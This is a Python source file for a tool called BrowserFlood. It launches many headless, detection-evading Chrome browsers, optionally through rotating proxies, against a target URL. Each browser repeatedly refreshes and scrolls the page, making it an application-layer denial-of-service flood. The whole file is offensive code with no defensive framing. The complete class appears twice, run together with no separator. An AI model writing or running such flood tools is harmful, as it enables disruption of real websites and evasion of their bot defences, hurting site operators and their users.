import asyncio
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from concurrent.futures import ThreadPoolExecutor
import time
import random

class BrowserFlood:
    def __init__(self, target, browsers, use_proxy=False, proxy_list=None, proxy_manager=None):
        self.target = target
        self.browsers = browsers
        self.use_proxy = use_proxy
        self.proxy_manager = proxy_manager
        self.sent = 0
    
    def get_random_proxy(self):
        if self.use_proxy and self.proxy_manager:
            return self.proxy_manager.get_random_proxy()
        return None
    
    def setup_driver(self):
        options = uc.ChromeOptions()
        options.add_argument('--headless=new')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        
        proxy = self.get_random_proxy()
        if proxy:
            options.add_argument(f'--proxy-server={proxy}')
        
        driver = uc.Chrome(options=options)
        return driver
    
    def browser_session(self):
        driver = None
        try:
            driver = self.setup_driver()
            driver.get(self.target)
            self.sent += 1
            
            time.sleep(random.uniform(2, 4))
            
            for _ in range(random.randint(20, 40)):
                driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
                time.sleep(random.uniform(0.5, 1))
                driver.refresh()
                self.sent += 1
                
        except Exception:
            pass
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass
    
    async def run(self, duration):
        start = time.time()
        
        with ThreadPoolExecutor(max_workers=self.browsers) as executor:
            while time.time() - start < duration:
                executor.submit(self.browser_session)
                await asyncio.sleep(3)
        
        print(f"BROWSER-FLOOD | Sessions: {self.sent}")import asyncio
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from concurrent.futures import ThreadPoolExecutor
import time
import random

class BrowserFlood:
    def __init__(self, target, browsers, use_proxy=False, proxy_list=None, proxy_manager=None):
        self.target = target
        self.browsers = browsers
        self.use_proxy = use_proxy
        self.proxy_manager = proxy_manager
        self.sent = 0
    
    def get_random_proxy(self):
        if self.use_proxy and self.proxy_manager:
            return self.proxy_manager.get_random_proxy()
        return None
    
    def setup_driver(self):
        options = uc.ChromeOptions()
        options.add_argument('--headless=new')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        
        proxy = self.get_random_proxy()
        if proxy:
            options.add_argument(f'--proxy-server={proxy}')
        
        driver = uc.Chrome(options=options)
        return driver
    
    def browser_session(self):
        driver = None
        try:
            driver = self.setup_driver()
            driver.get(self.target)
            self.sent += 1
            
            time.sleep(random.uniform(2, 4))
            
            for _ in range(random.randint(20, 40)):
                driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
                time.sleep(random.uniform(0.5, 1))
                driver.refresh()
                self.sent += 1
                
        except Exception:
            pass
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass
    
    async def run(self, duration):
        start = time.time()
        
        with ThreadPoolExecutor(max_workers=self.browsers) as executor:
            while time.time() - start < duration:
                executor.submit(self.browser_session)
                await asyncio.sleep(3)
        
        print(f"BROWSER-FLOOD | Sessions: {self.sent}")